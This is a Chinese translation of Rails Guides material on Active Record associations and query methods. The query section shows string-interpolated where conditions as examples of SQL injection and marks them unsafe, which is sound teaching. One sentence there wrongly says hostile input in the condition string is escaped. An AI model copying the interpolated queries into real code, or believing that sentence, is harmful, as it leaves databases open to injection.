person.posts.inspect # => [#<Post id: 5, name: "a1">, #<Post id: 5, name: "a1">]
Reading.all.inspect  # => [#<Reading id: 12, person_id: 5, post_id: 5>, #<Reading id: 13, person_id: 5, post_id: 5>]

在上面的代码中，读者读了两篇文章，即使是同一篇文章，person.posts 也会返回两个对象。

下面我们加入 distinct 方法：
class Person
  has_many :readings
  has_many :posts, -> { distinct }, through: :readings
end
 
person = Person.create(name: 'Honda')
post   = Post.create(name: 'a1')
person.posts << post
person.posts << post
person.posts.inspect # => [#<Post id: 7, name: "a1">]
Reading.all.inspect  # => [#<Reading id: 16, person_id: 7, post_id: 7>, #<Reading id: 17, person_id: 7, post_id: 7>]

在这段代码中，读者还是读了两篇文章，但 person.posts 只返回一个对象，因为加载的集合已经去除了重复元素。

如果要确保只把不重复的记录写入关联模型的数据表（这样就不会从数据库中获取重复记录了），需要在数据表上添加唯一性索引。例如，数据表名为 person_posts，我们要保证其中所有的文章都没重复，可以在迁移中加入以下代码：
add_index :person_posts, :post, unique: true

注意，使用 include? 等方法检查唯一性可能导致条件竞争。不要使用 include? 确保关联的唯一性。还是以前面的文章模型为例，下面的代码会导致条件竞争，因为多个用户可能会同时执行这一操作：
person.posts << post unless person.posts.include?(post)

####  4.3.4 什么时候保存对象

把对象赋值给 has_many 关联时，会自动保存对象（因为要更新外键）。如果一次赋值多个对象，所有对象都会自动保存。

如果无法通过验证，随便哪一次保存失败了，赋值语句就会返回 false，赋值操作会取消。

如果父对象（has_many 关联声明所在的模型）没保存（new_record? 方法返回 true），那么子对象也不会保存。只有保存了父对象，才会保存子对象。

如果赋值给 has_many 关联时不想保存对象，可以使用 collection.build 方法。

###  4.4 has_and_belongs_to_many 关联详解

has_and_belongs_to_many 关联建立两个模型之间的多对多关系。用数据库的行话说，这种关联的意思是有个连接数据表包含指向这两个类的外键。
####  4.4.1 has_and_belongs_to_many 关联添加的方法

声明 has_and_belongs_to_many 关联后，声明所在的类自动获得了 16 个关联相关的方法：

    collection(force_reload = false)
    collection<<(object, ...)
    collection.delete(object, ...)
    collection.destroy(object, ...)
    collection=objects
    collection_singular_ids
    collection_singular_ids=ids
    collection.clear
    collection.empty?
    collection.size
    collection.find(...)
    collection.where(...)
    collection.exists?(...)
    collection.build(attributes = {})
    collection.create(attributes = {})
    collection.create!(attributes = {})

这些个方法中的 collection 要替换成传入 has_and_belongs_to_many 方法的第一个参数。collection_singular 要替换成第一个参数的单数形式。例如，如下的声明：
class Part < ActiveRecord::Base
  has_and_belongs_to_many :assemblies
end

每个 Part 模型实例都获得了这些方法：
assemblies(force_reload = false)
assemblies<<(object, ...)
assemblies.delete(object, ...)
assemblies.destroy(object, ...)
assemblies=objects
assembly_ids
assembly_ids=ids
assemblies.clear
assemblies.empty?
assemblies.size
assemblies.find(...)
assemblies.where(...)
assemblies.exists?(...)
assemblies.build(attributes = {}, ...)
assemblies.create(attributes = {})
assemblies.create!(attributes = {})
#####  4.4.1.1 额外的字段方法

如果 has_and_belongs_to_many 关联使用的连接数据表中，除了两个外键之外还有其他字段，通过关联获取的记录中会包含这些字段，但是只读字段，因为 Rails 不知道如何保存对这些字段的改动。

在 has_and_belongs_to_many 关联的连接数据表中使用其他字段的功能已经废弃。如果在多对多关联中需要使用这么复杂的数据表，可以用 has_many :through 关联代替 has_and_belongs_to_many 关联。
#####  4.4.1.2 collection(force_reload = false)

collection 方法返回一个数组，包含所有关联的对象。如果没有关联的对象，则返回空数组。
@assemblies = @part.assemblies
#####  4.4.1.3 collection<<(object, ...)

collection<< 方法向关联对象数组中添加一个或多个对象，并在连接数据表中创建相应的记录。
@part.assemblies << @assembly1

这个方法与 collection.concat 和 collection.push 是同名方法。
#####  4.4.1.4 collection.delete(object, ...)

collection.delete 方法从关联对象数组中删除一个或多个对象，并删除连接数据表中相应的记录。
@part.assemblies.delete(@assembly1)

这个方法不会触发连接记录上的回调。
#####  4.4.1.5 collection.destroy(object, ...)

collection.destroy 方法在连接数据表中的记录上调用 destroy 方法，从关联对象数组中删除一个或多个对象，还会触发回调。这个方法不会销毁对象本身。
@part.assemblies.destroy(@assembly1)
#####  4.4.1.6 collection=objects

collection= 让关联对象数组只包含指定的对象，根据需求会添加或删除对象。
#####  4.4.1.7 collection_singular_ids

collection_singular_ids 返回一个数组，包含关联对象数组中各对象的 ID。
@assembly_ids = @part.assembly_ids
#####  4.4.1.8 collection_singular_ids=ids

collection_singular_ids= 方法让数组中只包含指定的主键，根据需要增删 ID。
#####  4.4.1.9 collection.clear

collection.clear 方法删除数组中的所有对象，并把连接数据表中的相应记录删除。这个方法不会销毁关联对象。
#####  4.4.1.10 collection.empty?

如果关联数组中没有关联对象，collection.empty? 方法返回 true。
<% if @part.assemblies.empty? %>
  This part is not used in any assemblies
<% end %>
#####  4.4.1.11 collection.size

collection.size 返回关联对象数组中的对象数量。
@assembly_count = @part.assemblies.size
#####  4.4.1.12 collection.find(...)

collection.find 方法在关联对象数组中查找对象，句法和可用选项跟 ActiveRecord::Base.find 方法一样。同时还限制对象必须在集合中。
@assembly = @part.assemblies.find(1)
#####  4.4.1.13 collection.where(...)

collection.where 方法根据指定的条件在关联对象数组中查找对象，但会惰性加载对象，用到对象时才会执行查询。同时还限制对象必须在集合中。
@new_assemblies = @part.assemblies.where("created_at > ?", 2.days.ago)
#####  4.4.1.14 collection.exists?(...)

collection.exists? 方法根据指定的条件检查关联对象数组中是否有符合条件的对象，句法和可用选项跟 ActiveRecord::Base.exists? 方法一样。
#####  4.4.1.15 collection.build(attributes = {})

collection.build 方法返回一个此种关联类型的新对象。这个对象会使用传入的属性初始化，还会在连接数据表中创建对应的记录，但不会保存关联对象。
@assembly = @part.assemblies.build({assembly_name: "Transmission housing"})
#####  4.4.1.16 collection.create(attributes = {})

collection.create 方法返回一个此种关联类型的新对象。这个对象会使用传入的属性初始化，还会在连接数据表中创建对应的记录，只要能通过所有数据验证，就会保存关联对象。
@assembly = @part.assemblies.create({assembly_name: "Transmission housing"})
#####  4.4.1.17 collection.create!(attributes = {})

作用和 collection.create 相同，但如果记录不合法会抛出 ActiveRecord::RecordInvalid 异常。

####  4.4.2 has_and_belongs_to_many 方法的选项

Rails 的默认设置足够智能，能满足常见需求。但有时还是需要定制 has_and_belongs_to_many 关联的行为。定制的方法很简单，声明关联时传入选项即可。例如，下面的关联使用了两个选项：
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies, autosave: true,
                                       readonly: true
end

has_and_belongs_to_many 关联支持以下选项：

    :association_foreign_key
    :autosave
    :class_name
    :foreign_key
    :join_table
    :validate
    :readonly

#####  4.4.2.1 :association_foreign_key

按照约定，在连接数据表中用来指向另一个模型的外键名是模型名后加 _id。:association_foreign_key 选项可以设置要使用的外键名：

:foreign_key 和 :association_foreign_key 这两个选项在设置多对多自连接时很有用。
class User < ActiveRecord::Base
  has_and_belongs_to_many :friends,
      class_name: "User",
      foreign_key: "this_user_id",
      association_foreign_key: "other_user_id"
end
#####  4.4.2.2 :autosave

如果把 :autosave 选项设为 true，保存父对象时，会自动保存所有子对象，并把标记为析构的子对象销毁。
#####  4.4.2.3 :class_name

如果另一个模型无法从关联的名字获取，可以使用 :class_name 选项指定模型名。例如，一个部件由多个装配件组成，但表示装配件的模型是 Gadget，就可以这样声明关联：
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies, class_name: "Gadget"
end
#####  4.4.2.4 :foreign_key

按照约定，在连接数据表中用来指向模型的外键名是模型名后加 _id。:foreign_key 选项可以设置要使用的外键名：
class User < ActiveRecord::Base
  has_and_belongs_to_many :friends,
      class_name: "User",
      foreign_key: "this_user_id",
      association_foreign_key: "other_user_id"
end
#####  4.4.2.5 :join_table

如果默认按照字典顺序生成的默认名不能满足要求，可以使用 :join_table 选项指定。
#####  4.4.2.6 :validate

如果把 :validate 选项设为 false，保存对象时，不会验证关联对象。该选项的默认值是 true，保存对象验证关联的对象。

####  4.4.3 has_and_belongs_to_many 的作用域

有时可能需要定制 has_and_belongs_to_many 关联使用的查询方式，定制的查询可在作用域代码块中指定。例如：
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies, -> { where active: true }
end

在作用域代码块中可以使用任何一个标准的查询方法。下面分别介绍这几个方法：

    where
    extending
    group
    includes
    limit
    offset
    order
    readonly
    select
    uniq

#####  4.4.3.1 where

where 方法指定关联对象必须满足的条件。
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies,
    -> { where "factory = 'Seattle'" }
end

条件还可以使用 Hash 的形式指定：
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies,
    -> { where factory: 'Seattle' }
end

如果 where 使用 Hash 形式，通过这个关联创建的记录会自动使用 Hash 中的作用域。针对上面的例子，使用 @parts.assemblies.create 或 @parts.assemblies.build 创建订单时，会自动把 factory 字段的值设为 "Seattle"。
#####  4.4.3.2 extending

extending 方法指定一个模块名，用来扩展关联代理。后文会详细介绍关联扩展。
#####  4.4.3.3 group

group 方法指定一个属性名，用在 SQL GROUP BY 子句中，分组查询结果。
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies, -> { group "factory" }
end
#####  4.4.3.4 includes

includes 方法指定使用关联时要按需加载的间接关联。
#####  4.4.3.5 limit

limit 方法限制通过关联获取的对象数量。
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies,
    -> { order("created_at DESC").limit(50) }
end
#####  4.4.3.6 offset

offset 方法指定通过关联获取对象时的偏移量。例如，-> { offset(11) } 会跳过前 11 个记录。
#####  4.4.3.7 order

order 方法指定获取关联对象时使用的排序方式，用于 SQL ORDER BY 子句。
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies,
    -> { order "assembly_name ASC" }
end
#####  4.4.3.8 readonly

如果使用 readonly，通过关联获取的对象就是只读的。
#####  4.4.3.9 select

select 方法用来覆盖获取关联对象数据的 SQL SELECT 子句。默认情况下，Rails 会读取所有字段。
#####  4.4.3.10 uniq

uniq 方法用来删除集合中重复的对象。

####  4.4.4 什么时候保存对象

把对象赋值给 has_and_belongs_to_many 关联时，会自动保存对象（因为要更新外键）。如果一次赋值多个对象，所有对象都会自动保存。

如果无法通过验证，随便哪一次保存失败了，赋值语句就会返回 false，赋值操作会取消。

如果父对象（has_and_belongs_to_many 关联声明所在的模型）没保存（new_record? 方法返回 true），那么子对象也不会保存。只有保存了父对象，才会保存子对象。

如果赋值给 has_and_belongs_to_many 关联时不想保存对象，可以使用 collection.build 方法。

###  4.5 关联回调

普通回调会介入 Active Record 对象的生命周期，在很多时刻处理对象。例如，可以使用 :before_save 回调在保存对象之前处理对象。

关联回调和普通回调差不多，只不过由集合生命周期中的事件触发。关联回调有四种：

    before_add
    after_add
    before_remove
    after_remove

关联回调在声明关联时定义。例如：
class Customer < ActiveRecord::Base
  has_many :orders, before_add: :check_credit_limit
 
  def check_credit_limit(order)
    ...
  end
end

Rails 会把添加或删除的对象传入回调。

同一事件可触发多个回调，多个回调使用数组指定：
class Customer < ActiveRecord::Base
  has_many :orders,
    before_add: [:check_credit_limit, :calculate_shipping_charges]
 
  def check_credit_limit(order)
    ...
  end
 
  def calculate_shipping_charges(order)
    ...
  end
end

如果 before_add 回调抛出异常，不会把对象加入集合。类似地，如果 before_remove 抛出异常，对象不会从集合中删除。
###  4.6 关联扩展

Rails 基于关联代理对象自动创建的功能是死的，但是可以通过匿名模块、新的查询方法、创建对象的方法等进行扩展。例如：
class Customer < ActiveRecord::Base
  has_many :orders do
    def find_by_order_prefix(order_number)
      find_by(region_id: order_number[0..2])
    end
  end
end

如果扩展要在多个关联中使用，可以将其写入具名扩展模块。例如：
module FindRecentExtension
  def find_recent
    where("created_at > ?", 5.days.ago)
  end
end
 
class Customer < ActiveRecord::Base
  has_many :orders, -> { extending FindRecentExtension }
end
 
class Supplier < ActiveRecord::Base
  has_many :deliveries, -> { extending FindRecentExtension }
end

在扩展中可以使用如下 proxy_association 方法的三个属性获取关联代理的内部信息：

    proxy_association.owner：返回关联所属的对象；
    proxy_association.reflection：返回描述关联的反射对象；
    proxy_association.target：返回 belongs_to 或 has_one 关联的关联对象，或者 has_many 或 has_and_belongs_to_many 关联的关联对象集合；

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Active Record 查询

本文介绍使用 Active Record 从数据库中获取数据的不同方法。

读完本文，你将学到：

    如何使用各种方法查找满足条件的记录；
    如何指定查找记录的排序方式，获取哪些属性，分组等；
    获取数据时如何使用按需加载介绍数据库查询数；
    如何使用动态查询方法；
    如何检查某个记录是否存在；
    如何在 Active Record 模型中做各种计算；
    如何执行 EXPLAIN 命令；

Chapters

    从数据库中获取对象
        获取单个对象
        获取多个对象
        批量获取多个对象
    条件查询
        纯字符串条件
        数组条件
        Hash 条件
        NOT 条件
    排序
    查询指定字段
    限量和偏移
    分组
    分组筛选
    条件覆盖
        unscope
        only
        reorder
        reverse_order
        rewhere
    空关系
    只读对象
    更新时锁定记录
        乐观锁定
        悲观锁定
    连接数据表
        使用字符串形式的 SQL 语句
        使用数组或 Hash 指定具名关联
        指定用于连接数据表上的条件
    按需加载关联
        按需加载多个关联
        指定用于按需加载关联上的条件
    作用域
        传入参数
        合并作用域
        指定默认作用域
        删除所有作用域
    动态查询方法
    查找或构建新对象
        find_or_create_by
        find_or_create_by!
        find_or_initialize_by
    使用 SQL 语句查询
        select_all
        pluck
        ids
    检查对象是否存在
    计算
        计数
        平均值
        最小值
        最大值
        求和
    执行 EXPLAIN 命令
        解读 EXPLAIN 命令的输出结果

如果习惯使用 SQL 查询数据库，会发现在 Rails 中执行相同的查询有更好的方式。大多数情况下，在 Active Record 中无需直接使用 SQL。

文中的实例代码会用到下面一个或多个模型：

下面所有的模型除非有特别说明之外，都使用 id 做主键。
class Client < ActiveRecord::Base
  has_one :address
  has_many :orders
  has_and_belongs_to_many :roles
end
class Address < ActiveRecord::Base
  belongs_to :client
end
class Order < ActiveRecord::Base
  belongs_to :client, counter_cache: true
end
class Role < ActiveRecord::Base
  has_and_belongs_to_many :clients
end

Active Record 会代你执行数据库查询，可以兼容大多数数据库（MySQL，PostgreSQL 和 SQLite 等）。不管使用哪种数据库，所用的 Active Record 方法都是一样的。
##  1 从数据库中获取对象

### 方法概览
Active Record 提供了很多查询方法，用来从数据库中获取对象。每个查询方法都接可接受参数，不用直接写 SQL 就能在数据库中执行指定的查询。

这些方法是：

    bind
    create_with
    distinct
    eager_load
    extending
    from
    group
    having
    includes
    joins
    limit
    lock
    none
    offset
    order
    preload
    readonly
    references
    reorder
    reverse_order
    select
    uniq
    where

上述所有方法都返回一个 ActiveRecord::Relation 实例。

Model.find(options) 方法执行的主要操作概括如下：

    把指定的选项转换成等价的 SQL 查询语句；
    执行 SQL 查询，从数据库中获取结果；
    为每个查询结果实例化一个对应的模型对象；
    如果有 after_find 回调，再执行 after_find 回调；

###  1.1 获取单个对象

在 Active Record 中获取单个对象有好几种方法。
####  1.1.1 使用主键

使用 Model.find(primary_key) 方法可以获取指定主键对应的对象。例如：
# Find the client with primary key (id) 10.
client = Client.find(10)
# => #<Client id: 10, first_name: "Ryan">

和上述方法等价的 SQL 查询是：
SELECT * FROM clients WHERE (clients.id = 10) LIMIT 1

如果未找到匹配的记录，Model.find(primary_key) 会抛出 ActiveRecord::RecordNotFound 异常。

####  1.1.2 take

Model.take 方法会获取一个记录，不考虑任何顺序。例如：
client = Client.take
# => #<Client id: 1, first_name: "Lifo">

和上述方法等价的 SQL 查询是：
SELECT * FROM clients LIMIT 1

如果没找到记录，Model.take 不会抛出异常，而是返回 nil。

获取的记录根据所用的数据库引擎会有所不同。
####  1.1.3 first

Model.first 获取按主键排序得到的第一个记录。例如：
client = Client.first
# => #<Client id: 1, first_name: "Lifo">

和上述方法等价的 SQL 查询是：
SELECT * FROM clients ORDER BY clients.id ASC LIMIT 1

Model.first 如果没找到匹配的记录，不会抛出异常，而是返回 nil。
####  1.1.4 last

Model.last 获取按主键排序得到的最后一个记录。例如：
client = Client.last
# => #<Client id: 221, first_name: "Russel">

和上述方法等价的 SQL 查询是：
SELECT * FROM clients ORDER BY clients.id DESC LIMIT 1

Model.last 如果没找到匹配的记录，不会抛出异常，而是返回 nil。
####  1.1.5 find_by

Model.find_by 获取满足条件的第一个记录。例如：
Client.find_by first_name: 'Lifo'
# => #<Client id: 1, first_name: "Lifo">
 
Client.find_by first_name: 'Jon'
# => nil

等价于：
Client.where(first_name: 'Lifo').take
####  1.1.6 take!

Model.take! 方法会获取一个记录，不考虑任何顺序。例如：
client = Client.take!
# => #<Client id: 1, first_name: "Lifo">

和上述方法等价的 SQL 查询是：
SELECT * FROM clients LIMIT 1

如果未找到匹配的记录，Model.take! 会抛出 ActiveRecord::RecordNotFound 异常。
####  1.1.7 first!

Model.first! 获取按主键排序得到的第一个记录。例如：
client = Client.first!
# => #<Client id: 1, first_name: "Lifo">

和上述方法等价的 SQL 查询是：
SELECT * FROM clients ORDER BY clients.id ASC LIMIT 1

如果未找到匹配的记录，Model.first! 会抛出 ActiveRecord::RecordNotFound 异常。
####  1.1.8 last!

Model.last! 获取按主键排序得到的最后一个记录。例如：
client = Client.last!
# => #<Client id: 221, first_name: "Russel">

和上述方法等价的 SQL 查询是：
SELECT * FROM clients ORDER BY clients.id DESC LIMIT 1

如果未找到匹配的记录，Model.last! 会抛出 ActiveRecord::RecordNotFound 异常。
####  1.1.9 find_by!

Model.find_by! 获取满足条件的第一个记录。如果没找到匹配的记录，会抛出 ActiveRecord::RecordNotFound 异常。例如：
Client.find_by! first_name: 'Lifo'
# => #<Client id: 1, first_name: "Lifo">
 
Client.find_by! first_name: 'Jon'
# => ActiveRecord::RecordNotFound

等价于：
Client.where(first_name: 'Lifo').take!


###  1.2 获取多个对象
####  1.2.1 使用多个主键

Model.find(array_of_primary_key) 方法可接受一个由主键组成的数组，返回一个由主键对应记录组成的数组。例如：
# Find the clients with primary keys 1 and 10.
client = Client.find([1, 10]) # Or even Client.find(1, 10)
# => [#<Client id: 1, first_name: "Lifo">, #<Client id: 10, first_name: "Ryan">]

上述方法等价的 SQL 查询是：
SELECT * FROM clients WHERE (clients.id IN (1,10))

只要有一个主键的对应的记录未找到，Model.find(array_of_primary_key) 方法就会抛出 ActiveRecord::RecordNotFound 异常。
####  1.2.2 take

Model.take(limit) 方法获取 limit 个记录，不考虑任何顺序：
Client.take(2)
# => [#<Client id: 1, first_name: "Lifo">,
      #<Client id: 2, first_name: "Raf">]

和上述方法等价的 SQL 查询是：
SELECT * FROM clients LIMIT 2
####  1.2.3 first

Model.first(limit) 方法获取按主键排序的前 limit 个记录：
Client.first(2)
# => [#<Client id: 1, first_name: "Lifo">,
      #<Client id: 2, first_name: "Raf">]

和上述方法等价的 SQL 查询是：
SELECT * FROM clients ORDER BY id ASC LIMIT 2
####  1.2.4 last

Model.last(limit) 方法获取按主键降序排列的前 limit 个记录：
Client.last(2)
# => [#<Client id: 10, first_name: "Ryan">,
      #<Client id: 9, first_name: "John">]

和上述方法等价的 SQL 查询是：
SELECT * FROM clients ORDER BY id DESC LIMIT 2


###  1.3 批量获取多个对象
#### 批量获取的必要性
我们经常需要遍历由很多记录组成的集合，例如给大量用户发送邮件列表，或者导出数据。

我们可能会直接写出如下的代码：
# This is very inefficient when the users table has thousands of rows.
User.all.each do |user|
  NewsLetter.weekly_deliver(user)
end

但这种方法在数据表很大时就有点不现实了，因为 User.all.each 会一次读取整个数据表，一行记录创建一个模型对象，然后把整个模型对象数组存入内存。如果记录数非常多，可能会用完内存。

Rails 为了解决这种问题提供了两个方法，把记录分成几个批次，不占用过多内存。第一个方法是 find_each，获取一批记录，然后分别把每个记录传入代码块。第二个方法是 find_in_batches，获取一批记录，然后把整批记录作为数组传入代码块。

find_each 和 find_in_batches 方法的目的是分批处理无法一次载入内存的巨量记录。如果只想遍历几千个记录，更推荐使用常规的查询方法。

####  1.3.1 find_each

find_each 方法获取一批记录，然后分别把每个记录传入代码块。在下面的例子中，find_each 获取 1000 个记录，然后把每个记录传入代码块，直到所有记录都处理完为止：
User.find_each do |user|
  NewsLetter.weekly_deliver(user)
end
#####  1.3.1.1 find_each 方法的选项

在 find_each 方法中可使用 find 方法的大多数选项，但不能使用 :order 和 :limit，因为这两个选项是保留给 find_each 内部使用的。

find_each 方法还可使用另外两个选项：:batch_size 和 :start。

:batch_size

:batch_size 选项指定在把各记录传入代码块之前，各批次获取的记录数量。例如，一个批次获取 5000 个记录：
User.find_each(batch_size: 5000) do |user|
  NewsLetter.weekly_deliver(user)
end

:start

默认情况下，按主键的升序方式获取记录，其中主键的类型必须是整数。如果不想用最小的 ID，可以使用 :start 选项指定批次的起始 ID。例如，前面的批量处理中断了，但保存了中断时的 ID，就可以使用这个选项继续处理。

例如，在有 5000 个记录的批次中，只向主键大于 2000 的用户发送邮件列表，可以这么做：
User.find_each(start: 2000, batch_size: 5000) do |user|
  NewsLetter.weekly_deliver(user)
end

还有一个例子是，使用多个 worker 处理同一个进程队列。如果需要每个 worker 处理 10000 个记录，就可以在每个 worker 中设置相应的 :start 选项。
####  1.3.2 find_in_batches

find_in_batches 方法和 find_each 类似，都获取一批记录。二者的不同点是，find_in_batches 把整批记录作为一个数组传入代码块，而不是单独传入各记录。在下面的例子中，会把 1000 个单据一次性传入代码块，让代码块后面的程序处理剩下的单据：
# Give add_invoices an array of 1000 invoices at a time
Invoice.find_in_batches(include: :invoice_lines) do |invoices|
  export.add_invoices(invoices)
end

:include 选项可以让指定的关联和模型一同加载。
#####  1.3.2.1 find_in_batches 方法的选项

find_in_batches 方法和 find_each 方法一样，可以使用 :batch_size 和 :start 选项，还可使用常规的 find 方法中的大多数选项，但不能使用 :order 和 :limit 选项，因为这两个选项保留给 find_in_batches 方法内部使用。


##  2 条件查询

where 方法用来指定限制获取记录的条件，用于 SQL 语句的 WHERE 子句。条件可使用字符串、数组或 Hash 指定。
###  2.1 纯字符串条件

如果查询时要使用条件，可以直接指定。例如 Client.where("orders_count = '2'")，获取 orders_count 字段为 2 的客户记录。

**使用纯字符串指定条件可能导致 SQL 注入漏洞**。例如，Client.where("first_name LIKE '%#{params[:first_name]}%'")，这里的条件就不安全。推荐使用的条件指定方式是数组，请阅读下一节。
###  2.2 数组条件

如果数字是在别处动态生成的话应该怎么处理呢？可用下面的查询：
Client.where("orders_count = ?", params[:orders])

Active Record 会先处理第一个元素中的条件，然后使用后续元素替换第一个元素中的问号（?）。

指定多个条件的方式如下：
Client.where("orders_count = ? AND locked = ?", params[:orders], false)

在这个例子中，第一个问号会替换成 params[:orders] 的值；第二个问号会替换成 false 在 SQL 中对应的值，具体的值视所用的适配器而定。

下面这种形式
Client.where("orders_count = ?", params[:orders])

要比这种形式好
Client.where("orders_count = #{params[:orders]}")

因为前者传入的参数更安全。直接在条件字符串中指定的条件会原封不动的传给数据库。也就是说，即使用户不怀好意，条件也会转义。如果这么做，整个数据库就处在一个危险境地，只要用户发现可以接触数据库，就能做任何想做的事。所以，千万别直接在条件字符串中使用参数。

关于 SQL 注入更详细的介绍，请阅读“Ruby on Rails 安全指南”
####  2.2.1 条件中的占位符

除了使用问号占位之外，在数组条件中还可使用键值对 Hash 形式的占位符：
Client.where("created_at >= :start_date AND created_at <= :end_date",
  {start_date: params[:start_date], end_date: params[:end_date]})

如果条件中有很多参数，使用这种形式可读性更高。
###  2.3 Hash 条件

Active Record 还允许使用 Hash 条件，提高条件语句的可读性。使用 Hash 条件时，传入 Hash 的键是要设定条件的字段，值是要设定的条件。

在 Hash 条件中只能指定相等。范围和子集这三种条件。
####  2.3.1 相等
Client.where(locked: true)

字段的名字还可使用字符串表示：
Client.where('locked' => true)

在 belongs_to 关联中，如果条件中的值是模型对象，可用关联键表示。这种条件指定方式也可用于多态关联。
Post.where(author: author)
Author.joins(:posts).where(posts: { author: author })

条件的值不能为 Symbol。例如，不能这么指定条件：Client.where(status: :active)。
####  2.3.2 范围
Client.where(created_at: (Time.now.midnight - 1.day)..Time.now.midnight)

指定这个条件后，会使用 SQL BETWEEN 子句查询昨天创建的客户：
SELECT * FROM clients WHERE (clients.created_at BETWEEN '2008-12-21 00:00:00' AND '2008-12-22 00:00:00')

这段代码演示了数组条件的简写形式。
####  2.3.3 子集

如果想使用 IN 子句查询记录，可以在 Hash 条件中使用数组：
Client.where(orders_count: [1,3,5])

上述代码生成的 SQL 语句如下：
SELECT * FROM clients WHERE (clients.orders_count IN (1,3,5))

###  2.4 NOT 条件

SQL NOT 查询可用 where.not 方法构建。
Post.where.not(author: author)

也即是说，这个查询首先调用没有参数的 where 方法，然后再调用 not 方法。


##  3 排序

要想按照特定的顺序从数据库中获取记录，可以使用 order 方法。

例如，想按照 created_at 的升序方式获取一些记录，可以这么做：
Client.order(:created_at)
# OR
Client.order("created_at")

还可使用 ASC 或 DESC 指定排序方式：
Client.order(created_at: :desc)
# OR
Client.order(created_at: :asc)
# OR
Client.order("created_at DESC")
# OR
Client.order("created_at ASC")

或者使用多个字段排序：
Client.order(orders_count: :asc, created_at: :desc)
# OR
Client.order(:orders_count, created_at: :desc)
# OR
Client.order("orders_count ASC, created_at DESC")
# OR
Client.order("orders_count ASC", "created_at DESC")

如果想在不同的上下文中多次调用 order，可以在前一个 order 后再调用一次：
Client.order("orders_count ASC").order("created_at DESC")
# SELECT * FROM clients ORDER BY orders_count ASC, created_at DESC

##  4 查询指定字段

默认情况下，Model.find 使用 SELECT * 查询所有字段。

要查询部分字段，可使用 select 方法。

例如，只查询 viewable_by 和 locked 字段：
Client.select("viewable_by, locked")

上述查询使用的 SQL 语句如下：
SELECT viewable_by, locked FROM clients

使用时要注意，因为模型对象只会使用选择的字段初始化。如果字段不能初始化模型对象，会得到以下异常：
ActiveModel::MissingAttributeError: missing attribute: <attribute>

其中 <attribute> 是所查询的字段。id 字段不会抛出 ActiveRecord::MissingAttributeError 异常，所以在关联中使用时要注意，因为关联需要 id 字段才能正常使用。

如果查询时希望指定字段的同值记录只出现一次，可以使用 distinct 方法：
Client.select(:name).distinct

上述方法生成的 SQL 语句如下：
SELECT DISTINCT name FROM clients

查询后还可以删除唯一性限制：
query = Client.select(:name).distinct
# => Returns unique names
 
query.distinct(false)
# => Returns all names, even if there are duplicates

##  5 限量和偏移

要想在 Model.find 方法中使用 SQL LIMIT 子句，可使用 limit 和 offset 方法。

limit 方法指定获取的记录数量，offset 方法指定在返回结果之前跳过多少个记录。例如：
Client.limit(5)

上述查询最大只会返回 5 各客户对象，因为没指定偏移，多以会返回数据表中的前 5 个记录。生成的 SQL 语句如下：
SELECT * FROM clients LIMIT 5

再加上 offset 方法：
Client.limit(5).offset(30)

这时会从第 31 个记录开始，返回最多 5 个客户对象。生成的 SQL 语句如下：
SELECT * FROM clients LIMIT 5 OFFSET 30

##  6 分组

要想在查询时使用 SQL GROUP BY 子句，可以使用 group 方法。

例如，如果想获取一组订单的创建日期，可以这么做：
Order.select("date(created_at) as ordered_date, sum(price) as total_price").group("date(created_at)")

上述查询会只会为相同日期下的订单创建一个 Order 对象。

生成的 SQL 语句如下：
SELECT date(created_at) as ordered_date, sum(price) as total_price
FROM orders
GROUP BY date(created_at)

##  7 分组筛选

SQL 使用 HAVING 子句指定 GROUP BY 分组的条件。在 Model.find 方法中可使用 :having 选项指定 HAVING 子句。

例如：
Order.select("date(created_at) as ordered_date, sum(price) as total_price").
  group("date(created_at)").having("sum(price) > ?", 100)

生成的 SQL 如下：
SELECT date(created_at) as ordered_date, sum(price) as total_price
FROM orders
GROUP BY date(created_at)
HAVING sum(price) > 100

这个查询只会为同一天下的订单创建一个 Order 对象，而且这一天的订单总额要大于 $100。

##  8 条件覆盖
###  8.1 unscope

如果要删除某个条件可使用 unscope 方法。例如：
Post.where('id > 10').limit(20).order('id asc').unscope(:order)

生成的 SQL 语句如下：
SELECT * FROM posts WHERE id > 10 LIMIT 20
 
# Original query without `unscope`
SELECT * FROM posts WHERE id > 10 ORDER BY id asc LIMIT 20

unscope 还可删除 WHERE 子句中的条件。例如：
Post.where(id: 10, trashed: false).unscope(where: :id)
# SELECT "posts".* FROM "posts" WHERE trashed = 0

unscope 还可影响合并后的查询：
Post.order('id asc').merge(Post.unscope(:order))
# SELECT "posts".* FROM "posts"
###  8.2 only

查询条件还可使用 only 方法覆盖。例如：
Post.where('id > 10').limit(20).order('id desc').only(:order, :where)

执行的 SQL 语句如下：
SELECT * FROM posts WHERE id > 10 ORDER BY id DESC
 
# Original query without `only`
SELECT "posts".* FROM "posts" WHERE (id > 10) ORDER BY id desc LIMIT 20
###  8.3 reorder

reorder 方法覆盖原来的 order 条件。例如：
class Post < ActiveRecord::Base
  ..
  ..
  has_many :comments, -> { order('posted_at DESC') }
end
 
Post.find(10).comments.reorder('name')

执行的 SQL 语句如下：
SELECT * FROM posts WHERE id = 10 ORDER BY name

没用 reorder 方法时执行的 SQL 语句如下：
SELECT * FROM posts WHERE id = 10 ORDER BY posted_at DESC
###  8.4 reverse_order

reverse_order 方法翻转 ORDER 子句的条件。
Client.where("orders_count > 10").order(:name).reverse_order

执行的 SQL 语句如下：
SELECT * FROM clients WHERE orders_count > 10 ORDER BY name DESC

